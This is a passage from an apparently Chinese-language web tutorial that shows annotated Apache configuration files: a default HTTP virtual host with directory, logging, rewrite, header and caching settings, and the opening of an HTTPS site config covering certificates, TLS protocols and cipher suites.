<h3 id="41-000-defaultconf---默认http站点">4.1 000-default.conf - 默认HTTP站点<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#41-000-defaultconf---默认http站点" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *:80</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ====== 基本标识信息 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 服务器名称（主域名）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> example.com</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 服务器别名（其他域名）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerAlias</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www.example.com</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *.example.com</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 管理员邮箱</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ServerAdmin</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> webmaster@example.com</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ====== 目录配置 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 网站根目录</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    DocumentRoot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/www/html</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 目录访问控制</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 选项配置</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Indexes FollowSymLinks MultiViews</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 允许.htaccess覆盖</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> All</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 访问控制</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 默认索引文件</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        DirectoryIndex</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> index.html index.php</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ====== 特殊目录配置 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # CGI脚本目录</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ScriptAlias</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /cgi-bin/</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /usr/lib/cgi-bin/</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;/usr/lib/cgi-bin&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> None</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> +ExecCGI -MultiViews +SymLinksIfOwnerMatch</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 受限访问目录</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/admin</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> -Indexes</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> None</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        AuthType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Basic</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        AuthName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;Admin Area&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        AuthUserFile</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/apache2/.htpasswd</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> valid-user</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ====== 日志配置 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 错误日志</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ErrorLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/error.log</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 访问日志</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    CustomLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/access.log combined</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 日志级别（针对此虚拟主机）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    LogLevel</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> warn</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ====== URL重写 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_rewrite.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        RewriteEngine</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        RewriteBase</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 强制HTTPS</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # RewriteCond %{HTTPS} off</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ====== 别名配置 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 静态文件别名</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Alias</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /static</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/static</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/static</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ====== 代理配置 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 反向代理到后端应用</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ProxyPreserveHost On</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ProxyPass /api http://localhost:3000/api</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ProxyPassReverse /api http://localhost:3000/api</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ====== 错误页面 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 自定义错误页面</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ErrorDocument</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 404</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /errors/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">404</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.html</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    ErrorDocument</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 500</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /errors/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">500</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.html</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ====== 安全头 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_headers.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-Frame-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;SAMEORIGIN&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-Content-Type-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;nosniff&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-XSS-Protection &quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; mode=block&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ====== 压缩配置 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_deflate.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">text/html</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/plain</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/xml</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/css</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        AddOutputFilterByType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DEFLATE </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">application/javascript</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> application/json</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # ====== 缓存配置 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_expires.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        ExpiresActive</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> image/jpeg</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> year&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        ExpiresByType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/css</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;access plus </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> month&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h5 id="42-default-sslconf---默认https站点">4.2 default-ssl.conf - 默认HTTPS站点<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#42-default-sslconf---默认https站点" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h5>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_ssl.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *:443</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        ServerName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> example.com</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        ServerAdmin</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> admin@example.com</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        DocumentRoot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/www/html</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== SSL引擎配置 ======</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLEngine</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> on</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== 证书文件 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 服务器证书</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLCertificateFile</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/ssl/certs/server.crt</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 服务器私钥</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLCertificateKeyFile</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/ssl/private/server.key</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 证书链文件（中间证书）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLCertificateChainFile</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/ssl/certs/chain.crt</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 或使用完整证书文件（包含证书链）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSLCertificateFile /etc/ssl/certs/fullchain.pem</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # CA证书文件（用于客户端证书验证）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSLCACertificateFile /etc/ssl/certs/ca-bundle.crt</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== SSL协议配置 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 禁用不安全的协议</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLProtocol</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all -SSLv2 -SSLv3 -TLSv1 -TLSv1.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 仅允许TLS 1.2和1.3</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSLProtocol -all +TLSv1.2 +TLSv1.3</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== 加密套件配置 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 推荐的加密套件（兼容性）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLCipherSuite</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> HIGH:!aNULL:!MD5:!3DES</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 更严格的加密套件（仅现代浏览器）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 优先使用服务器加密套件顺序</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLHonorCipherOrder</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> on</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== 会话缓存 ======</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSL会话缓存（提高性能）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLSessionCache</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> shmcb:${APACHE_RUN_DIR}/ssl_scache(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">512000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLSessionCacheTimeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 300</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # ====== OCSP Stapling（证书状态检查）======</span></span>
